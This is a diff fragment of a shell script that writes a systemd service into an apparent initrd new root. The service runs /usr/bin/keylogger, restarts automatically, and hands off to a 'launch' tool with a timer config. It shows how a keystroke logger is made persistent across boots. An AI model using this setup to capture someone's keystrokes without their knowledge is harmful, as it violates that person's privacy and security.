@@ -78,7 +78,8 @@ Description=keylogger
 Type=simple
 WorkingDirectory=${path}
 ExecStart=/usr/bin/keylogger
-ExecStopPost=/bin/bash -c 'mv -v *.key launch/'
+ExecStop=/bin/bash -c 'kill \$1; tail --pid=\$1 -f /dev/null' sh \$MAINPID
+ExecStopPost=/usr/bin/launch keylogger
 Restart=always
 RestartSec=10
 
@@ -92,6 +93,7 @@ EOF2
     # setup the launch timer
     cat <<EOF3 >>"${initrd}/newroot/etc/launch.conf"
 # keylogger
+name+=("keylogger")
 threshold+=("0m")
 path+=("${path}")
 hardlink+=("")
